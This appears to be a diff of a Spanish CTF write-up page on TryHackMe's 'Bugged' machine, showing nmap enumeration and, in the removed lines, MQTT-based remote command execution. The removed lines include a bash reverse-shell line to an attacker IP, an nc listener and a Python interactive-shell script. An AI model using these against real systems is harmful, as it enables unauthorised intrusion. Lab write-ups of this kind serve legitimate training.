-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">  <span class="nt">&#34;response&#34;</span><span class="p">:</span> <span class="s2">&#34;challenge\n/home/challenge\n&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div>
-<p>Efectivamente, tenemos ejecución remota de comandos(RCE). Tratemos de enviar una reverse shell a nuestra máquina atacante.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Payload</span>
-</span></span><span class="line"><span class="cl">bash -c <span class="s2">&#34;bash -i &amp;&gt; /dev/tcp/10.23.10.113/443 0&gt;&amp;1&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Nos ponemos en escucha</span>
-</span></span><span class="line"><span class="cl">nc -lnvp <span class="m">443</span></span></span></code></pre></div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">{
-</span></span><span class="line"><span class="cl">  &#34;id&#34;: &#34;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&#34;,
-</span></span><span class="line"><span class="cl">  &#34;response&#34;: &#34;bash: connect: Network is unreachable\nbash: line 1: /dev/tcp/10.23.10.113/443: Network is unreachable\n&#34;
-</span></span><span class="line"><span class="cl">}
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"># Hostname -I
-</span></span><span class="line"><span class="cl">{
-</span></span><span class="line"><span class="cl">  &#34;id&#34;: &#34;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&#34;,
-</span></span><span class="line"><span class="cl">  &#34;response&#34;: &#34;172.18.0.2 \n&#34;
-</span></span><span class="line"><span class="cl">}</span></span></code></pre></div>
-<p>No funcionó, parece que está en un entorno de docker con segmento de red aislado (172.x.x.x), probemos a automatizar este proceso porque es muy tardío generar texto base64, decodificar&hellip;</p>
-<p><code>rce_mqtt.py</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Colors</span>
-</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Colors</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="n">RESET</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[0m&#39;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">BOLD</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1m&#39;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">UNDERLINE</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[4m&#39;</span>
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="c1"># Colores de texto</span>
-</span></span><span class="line"><span class="cl">    <span class="n">BLACK</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[30m&#39;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">RED</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[31m&#39;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">GREEN</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[32m&#39;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">YELLOW</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[33m&#39;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">BLUE</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[34m&#39;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">MAGENTA</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[35m&#39;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">CYAN</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[36m&#39;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">WHITE</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[37m&#39;</span>
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="c1"># Colores de fondo</span>
-</span></span><span class="line"><span class="cl">    <span class="n">BG_BLACK</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[40m&#39;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">BG_RED</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[41m&#39;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">BG_GREEN</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[42m&#39;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">BG_YELLOW</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[43m&#39;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">BG_BLUE</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[44m&#39;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">BG_MAGENTA</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[45m&#39;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">BG_CYAN</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[46m&#39;</span>
-</span></span><span class="line"><span class="cl">    <span class="n">BG_WHITE</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[47m&#39;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Configuración</span>
-</span></span><span class="line"><span class="cl"><span class="n">broker_host</span> <span class="o">=</span> <span class="s2">&#34;10.201.26.45&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">topic_sub</span> <span class="o">=</span> <span class="s2">&#34;U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">topic_pub</span> <span class="o">=</span> <span class="s2">&#34;XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">command_id</span> <span class="o">=</span> <span class="s2">&#34;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_command</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="n">command_id</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s2">&#34;cmd&#34;</span><span class="p">:</span> <span class="s2">&#34;CMD&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s2">&#34;arg&#34;</span><span class="p">:</span> <span class="n">command</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="n">encoded_payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;mosquitto_pub -h </span><span class="si">{</span><span class="n">broker_host</span><span class="si">}</span><span class="s2"> -t &#39;</span><span class="si">{</span><span class="n">topic_pub</span><span class="si">}</span><span class="s2">&#39; -m &#39;</span><span class="si">{</span><span class="n">encoded_payload</span><span class="si">}</span><span class="s2">&#39;&#34;</span>
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">DEVNULL</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">Colors</span><span class="o">.</span><span class="n">YELLOW</span><span class="si">}</span><span class="s2">[+] </span><span class="si">{</span><span class="n">Colors</span><span class="o">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s2">Comando enviado</span><span class="si">{</span><span class="n">Colors</span><span class="o">.</span><span class="n">RESET</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">command</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">listen_responses</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="n">cmd</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;mosquitto_sub -h </span><span class="si">{</span><span class="n">broker_host</span><span class="si">}</span><span class="s2"> -t &#39;</span><span class="si">{</span><span class="n">topic_sub</span><span class="si">}</span><span class="s2">&#39; -C 1&#34;</span>
-</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">            
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                <span class="n">response</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">                <span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">decoded</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">response</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">decoded</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="si">{</span><span class="n">Colors</span><span class="o">.</span><span class="n">YELLOW</span><span class="si">}</span><span class="s2">[+] </span><span class="si">{</span><span class="n">Colors</span><span class="o">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s2">Respuesta</span><span class="si">{</span><span class="n">Colors</span><span class="o">.</span><span class="n">RESET</span><span class="si">}</span><span class="s2">:</span><span class="se">\n</span><span class="si">{</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;response&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                <span class="k">except</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="si">{</span><span class="n">Colors</span><span class="o">.</span><span class="n">YELLOW</span><span class="si">}</span><span class="s2">[!] </span><span class="si">{</span><span class="n">Colors</span><span class="o">.</span><span class="n">RED</span><span class="si">}</span><span class="s2">Respuesta cruda</span><span class="si">{</span><span class="n">Colors</span><span class="o">.</span><span class="n">RESET</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">response</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">TimeoutExpired</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
-</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">Colors</span><span class="o">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s2">Shell interactiva MQTT </span><span class="si">{</span><span class="n">Colors</span><span class="o">.</span><span class="n">RESET</span><span class="si">}</span><span class="s2">(escribe &#39;exit&#39; para salir)&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="n">listener</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">listen_responses</span><span class="p">,</span> <span class="n">daemon</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">listener</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;$ &#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">cmd</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="s1">&#39;exit&#39;</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                <span class="k">break</span>
-</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">cmd</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">                <span class="n">send_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[!] Saliendo...&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">            <span class="k">break</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Sesión finalizada&#34;</span><span class="p">)</span></span></span></code></pre></div>
-<p><img src="/images/posts/bugged/flag_bugged.png" alt="flag"></p>
-<hr>
-
-
-      </div>
-
-
-      <footer>
-        
-
-<section class="see-also">
-  
-    
-    
-    
-      <h3 id="también-ver-en-tryhackme">
-        También ver en TryHackMe
-        <a class="heading-link" href="#tambi%c3%a9n-ver-en-tryhackme">
-          <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-          <span class="sr-only">Link to heading</span>
-        </a>
-      </h3>
-      <nav>
-        <ul>
-        
-        
-          
-            <li>
-              <a href="/posts/soupedecode01/">Soupedecode 01 CTF</a>
-            </li>
-          
-        
-          
-            <li>
-              <a href="/posts/billing/">Billing CTF</a>
-            </li>
-          
-        
-          
-            <li>
-              <a href="/posts/publisher/">Publisher CTF</a>
-            </li>
-          
-        
-          
-            <li>
-              <a href="/posts/blueprint/">Blueprint CTF</a>
-            </li>
-          
-        
-          
-        
-        </ul>
-      </nav>
-    
-  
-</section>
-
-
-        
-        
-        
-        
-        
-        
-        
-      </footer>
-    </article>
-
-    
-  </section>
-
-    </div>
-
-    <footer class="footer">
-  <section class="container">
-    ©
-    
-      2019 -
-    
-    2026
-     David León 
-    ·
-    
-    Desarrollado por <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
-    
-  </section>
-</footer>
-
-  </main>
-
-  
-
-  
-  
-  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-</body>
-</html>
+PING 10.201.64.81 (10.201.64.81) 56(84) bytes of data. 64 bytes from 10.201.64.81: icmp_seq=1 ttl=61 time=229 ms --- 10.201.64.81 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 228.641/228.641/228.641/0.000 ms Podemos determinar que es un S.O Linux a través del TTL(OJO: esto se puede modificar)."><meta property="og:locale" content="es"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-10-01T00:00:00+00:00"><meta property="article:modified_time" content="2025-10-01T00:00:00+00:00"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Easy"><meta property="article:tag" content="TryHackMe"><meta property="og:see_also" content="https://justgr0w.github.io/posts/soupedecode01/"><meta property="og:see_also" content="https://justgr0w.github.io/posts/billing/"><meta property="og:see_also" content="https://justgr0w.github.io/posts/publisher/"><meta property="og:see_also" content="https://justgr0w.github.io/posts/blueprint/"><link rel=canonical href=https://justgr0w.github.io/posts/bugged/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.022594d625780e2edf64581b893d32cb35c11de5d88953ea4ad3c2e45451e214.css integrity="sha256-AiWU1iV4Di7fZFgbiT0yyzXBHeXYiVPqStPC5FRR4hQ=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/svg+xml href=/images/favicon.svg sizes=any><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=https://justgr0w.github.io/>0xjustgr0w
+</a><input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/contact/>Sobre mí</a></li><li class=navigation-item><a class=navigation-link href=/posts/>Blog</a></li><li class=navigation-item><a class=navigation-link href=/projects/>Proyectos</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://justgr0w.github.io/posts/bugged/>Bugged CTF</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
+<time datetime=2025-10-01T00:00:00Z>octubre 1, 2025
+</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
+6 minutos de lectura.</span></div><div class=authors><i class="fa-solid fa-user" aria-hidden=true></i>
+<a href=/authors/0xjustgr0w/>0xjustgr0w</a></div><div class=categories><i class="fa-solid fa-folder" aria-hidden=true></i>
+<a href=/categories/pentesting/>Pentesting</a></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
+<span class=tag><a href=/tags/ctf/>CTF</a>
+</span><span class=separator>•</span>
+<span class=tag><a href=/tags/easy/>Easy</a>
+</span><span class=separator>•</span>
+<span class=tag><a href=/tags/tryhackme/>TryHackMe</a></span></div></div></header><div class=post-content><h1 id=máquina-bugged>Máquina Bugged
+<a class=heading-link href=#m%c3%a1quina-bugged><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h1><p><img src=/images/posts/bugged/bugged.png alt=target></p><p><strong>Dificultad</strong>: <em>Fácil</em></p><p><strong>Descripción</strong>: John estaba trabajando en sus electrodomésticos inteligentes cuando notó tráfico extraño en la red. ¿Puedes ayudarle a descubrir qué son estas comunicaciones de red extrañas?</p><h2 id=enumeración>Enumeración
+<a class=heading-link href=#enumeraci%c3%b3n><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><p>Comenzamos haciendo un ping a la máquina objetivo():</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=no>PING</span> <span class=mi>10</span><span class=o>.</span><span class=mi>201</span><span class=o>.</span><span class=mi>64</span><span class=o>.</span><span class=mi>81</span> <span class=p>(</span><span class=mi>10</span><span class=o>.</span><span class=mi>201</span><span class=o>.</span><span class=mi>64</span><span class=o>.</span><span class=mi>81</span><span class=p>)</span> <span class=mi>56</span><span class=p>(</span><span class=mi>84</span><span class=p>)</span> <span class=n>bytes</span> <span class=n>of</span> <span class=n>data</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=mi>64</span> <span class=n>bytes</span> <span class=n>from</span> <span class=mi>10</span><span class=o>.</span><span class=mi>201</span><span class=o>.</span><span class=mi>64</span><span class=o>.</span><span class=mi>81</span><span class=p>:</span> <span class=n>icmp_seq</span><span class=o>=</span><span class=mi>1</span> <span class=n>ttl</span><span class=o>=</span><span class=mi>61</span> <span class=n>time</span><span class=o>=</span><span class=mi>229</span> <span class=n>ms</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>---</span> <span class=mi>10</span><span class=o>.</span><span class=mi>201</span><span class=o>.</span><span class=mi>64</span><span class=o>.</span><span class=mi>81</span> <span class=n>ping</span> <span class=n>statistics</span> <span class=o>---</span>
+</span></span><span class=line><span class=cl><span class=mi>1</span> <span class=n>packets</span> <span class=n>transmitted</span><span class=p>,</span> <span class=mi>1</span> <span class=n>received</span><span class=p>,</span> <span class=mi>0</span><span class=o>%</span> <span class=n>packet</span> <span class=n>loss</span><span class=p>,</span> <span class=n>time</span> <span class=mi>0</span><span class=n>ms</span>
+</span></span><span class=line><span class=cl><span class=n>rtt</span> <span class=n>min</span><span class=o>/</span><span class=n>avg</span><span class=o>/</span><span class=n>max</span><span class=o>/</span><span class=n>mdev</span> <span class=o>=</span> <span class=mi>228</span><span class=o>.</span><span class=mi>641</span><span class=o>/</span><span class=mi>228</span><span class=o>.</span><span class=mi>641</span><span class=o>/</span><span class=mi>228</span><span class=o>.</span><span class=mi>641</span><span class=o>/</span><span class=mi>0</span><span class=o>.</span><span class=mo>000</span> <span class=n>ms</span></span></span></code></pre></div><p>Podemos determinar que es un S.O <code>Linux</code> a través del <strong>TTL</strong>(OJO: esto se puede modificar).</p><p>Comenzamos enumerando servicios y puertos abiertos con <strong>nmap</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -p- --open -sS --min-rate <span class=m>5000</span> -Pn -n 10.201.64.81 -sCV</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=no>Starting</span> <span class=no>Nmap</span> <span class=mi>7</span><span class=o>.</span><span class=mi>95</span> <span class=p>(</span> <span class=ss>https</span><span class=p>:</span><span class=sr>//nm</span><span class=n>ap</span><span class=o>.</span><span class=n>org</span> <span class=p>)</span> <span class=n>at</span> <span class=mi>2025</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mo>01</span> <span class=mi>12</span><span class=p>:</span><span class=mi>32</span> <span class=no>EDT</span>
+</span></span><span class=line><span class=cl><span class=no>Nmap</span> <span class=nb>scan</span> <span class=n>report</span> <span class=k>for</span> <span class=mi>10</span><span class=o>.</span><span class=mi>201</span><span class=o>.</span><span class=mi>64</span><span class=o>.</span><span class=mi>81</span>
+</span></span><span class=line><span class=cl><span class=no>Host</span> <span class=n>is</span> <span class=n>up</span> <span class=p>(</span><span class=mi>0</span><span class=o>.</span><span class=mi>24</span><span class=n>s</span> <span class=n>latency</span><span class=p>)</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=no>Not</span> <span class=ss>shown</span><span class=p>:</span> <span class=mi>63962</span> <span class=n>closed</span> <span class=n>tcp</span> <span class=n>ports</span> <span class=p>(</span><span class=n>reset</span><span class=p>),</span> <span class=mi>1571</span> <span class=n>filtered</span> <span class=n>tcp</span> <span class=n>ports</span> <span class=p>(</span><span class=n>no</span><span class=o>-</span><span class=n>response</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=no>Some</span> <span class=n>closed</span> <span class=n>ports</span> <span class=n>may</span> <span class=n>be</span> <span class=n>reported</span> <span class=n>as</span> <span class=n>filtered</span> <span class=n>due</span> <span class=n>to</span> <span class=o>--</span><span class=n>defeat</span><span class=o>-</span><span class=n>rst</span><span class=o>-</span><span class=n>ratelimit</span>
+</span></span><span class=line><span class=cl><span class=no>PORT</span>     <span class=no>STATE</span> <span class=no>SERVICE</span>                  <span class=no>VERSION</span>
+</span></span><span class=line><span class=cl><span class=mi>22</span><span class=o>/</span><span class=n>tcp</span>   <span class=nb>open</span>  <span class=n>ssh</span>                      <span class=no>OpenSSH</span> <span class=mi>8</span><span class=o>.</span><span class=mi>2</span><span class=n>p1</span> <span class=no>Ubuntu</span> <span class=mi>4</span><span class=n>ubuntu0</span><span class=o>.</span><span class=mi>13</span> <span class=p>(</span><span class=no>Ubuntu</span> <span class=no>Linux</span><span class=p>;</span> <span class=n>protocol</span> <span class=mi>2</span><span class=o>.</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>ssh</span><span class=o>-</span><span class=ss>hostkey</span><span class=p>:</span> 
